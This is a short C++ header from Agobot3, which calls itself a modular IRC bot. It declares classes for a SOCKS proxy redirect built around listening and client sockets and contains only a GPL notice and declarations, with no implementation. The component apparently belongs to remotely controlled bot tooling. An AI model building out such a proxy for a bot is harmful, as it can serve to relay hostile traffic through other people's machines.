/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __REDIR_SOCKS_H__
#define __REDIR_SOCKS_H__

#include "cstring.h"
#include "redirect.h"
#include "utility.h"

class CRedirectSOCKS;
class CRedirectSOCKS_Thread;

class CRedirectSOCKS_Thread : public CRedirectBase
{
public:
	CRedirectSOCKS_Thread();
	virtual void StartRedirect();

	CRedirectSOCKS				*m_pRedirSOCKS;

	CSocket						 m_sClientSocket;
};

class CRedirectSOCKS : public CRedirectBase
{
public:
	CRedirectSOCKS();
	virtual void StartRedirect();

	CSocket						 m_sListenSocket;
};

#endif // __REDIR_SOCKS_H__
